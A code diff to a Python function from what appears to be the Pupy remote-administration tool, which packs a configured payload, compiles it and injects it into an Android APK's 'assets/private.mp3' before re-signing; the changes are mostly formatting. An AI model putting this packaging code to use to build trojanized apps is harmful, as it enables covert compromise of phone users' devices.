@@ -234,18 +234,23 @@ def get_edit_apk(display, path, conf, compressed_config=None, debug=False):
     tempdir = tempfile.mkdtemp(prefix="tmp_pupy_")
     fd, tempapk = tempfile.mkstemp(prefix="tmp_pupy_")
     try:
-        packed_payload=pack_py_payload(display, get_raw_conf(display, conf), debug)
+        packed_payload = pack_py_payload(
+            display, get_raw_conf(display, conf), debug, False)
         shutil.copy(path, tempapk)
 
         #extracting the python-for-android install tar from the apk
-        zf=zipfile.ZipFile(path,'r')
+        zf= zipfile.ZipFile(path,'r')
         zf.extract("assets/private.mp3", tempdir)
         zf.close()
 
-        with open(os.path.join(tempdir,"pp.py"),'w') as w:
+        with open(os.path.join(tempdir,"pp.py"), 'w') as w:
             w.write(packed_payload)
+
         import py_compile
-        py_compile.compile(os.path.join(tempdir, "pp.py"), os.path.join(tempdir, "pp.pyo"))
+        py_compile.compile(
+            os.path.join(tempdir, "pp.py"),
+            os.path.join(tempdir, "pp.pyo")
+        )
 
         display(Success('Packaging the apk ... (can take 10-20 seconds)'))
 
@@ -256,7 +261,7 @@ def get_edit_apk(display, path, conf, compressed_config=None, debug=False):
         with open(os.path.join(tempdir,"assets/private.mp3"), 'r') as t:
             updateZip(tempapk, "assets/private.mp3", t.read())
 
-        #signing the tar
+        # signing the tar
         result = BytesIO()
         jarsigner(priv_key, pub_key, tempapk, result)
         return result.getvalue()
